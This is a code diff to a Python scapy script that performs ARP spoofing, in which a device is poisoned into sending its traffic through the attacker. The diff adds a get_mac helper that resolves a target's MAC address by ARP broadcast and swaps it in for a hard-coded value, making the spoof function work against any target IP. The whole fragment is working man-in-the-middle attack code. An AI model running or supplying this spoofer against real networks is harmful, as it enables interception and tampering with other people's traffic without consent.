@@ -36,13 +36,22 @@ def enable_ip_route(verbose=True):
     if verbose:
         print("[!] IP Routing enabled.")
 
+def get_mac(ip):
+    """
+    Returns MAC address of any device connected to the network
+    If ip is down, returns None instead
+    """
+    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
+    if ans:
+        return ans[0][1].src
+
 def spoof(target_ip, host_ip, verbose=True):
     """
     Spoofs `target_ip` saying that we are `host_ip`.
     it is accomplished by changing the ARP cache of the target (poisoning)
     """
     # get the mac address of the target
-    target_mac = "fe80::837:a5ff:fe9c:1ff"
+    target_mac = get_mac(target_ip)
     # craft the arp 'is-at' operation packet, in other words; an ARP response
     # we don't specify 'hwsrc' (source MAC address)
     # because by default, 'hwsrc' is the real MAC address of the sender (ours)
